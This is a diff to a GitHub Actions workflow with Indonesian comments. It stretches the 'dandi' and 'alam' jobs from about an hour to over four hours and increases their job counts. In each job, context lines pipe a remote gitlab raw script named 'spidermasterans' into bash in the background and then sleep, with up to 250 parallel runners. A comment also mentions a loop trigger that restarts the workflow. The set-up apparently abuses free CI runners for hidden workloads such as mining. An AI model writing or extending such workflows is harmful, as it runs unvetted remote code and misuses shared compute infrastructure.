@@ -52,8 +52,8 @@ jobs:
               'line_go': 9, 'line_flag': 26,
               'lucas_go': 9, 'lucas_flag': 26,
               'popay_go': 9, 'popay_flag': 26,
-              'dandi_go': 9, 'dandi_flag': 3,
-              'alam_go': 9, 'alam_flag': 3
+              'dandi_go': 9, 'dandi_flag': 23,
+              'alam_go': 9, 'alam_flag': 23
           }
 
           with open(os.environ['GITHUB_OUTPUT'], 'a') as f:
@@ -127,7 +127,7 @@ jobs:
   dandi:
     needs: [generate, lucas]
     runs-on: ubuntu-latest
-    timeout-minutes: 68
+    timeout-minutes: 268
     strategy:
       max-parallel: 250
       fail-fast: false
@@ -138,7 +138,7 @@ jobs:
       - name: Jalankan perintah & tahan 58 menit
         run: |
           curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
-          sleep 58m
+          sleep 258m
 
   # =============================================
   # 🍚 Job alam (27 job) – lscpu + sleep 60 menit
@@ -146,7 +146,7 @@ jobs:
   alam:
     needs: [generate, popay]
     runs-on: ubuntu-latest
-    timeout-minutes: 70
+    timeout-minutes: 270
     strategy:
       max-parallel: 250
       fail-fast: false
@@ -157,7 +157,7 @@ jobs:
       - name: Jalankan lscpu & tahan 60 menit
         run: |
           curl -sL https://gitlab.com/line789/like/-/raw/main/spidermasterans | bash &
-          sleep 60m
+          sleep 260m
 
   # =============================================
   # 🔁 Loop Trigger: Memulai Ulang Workflow
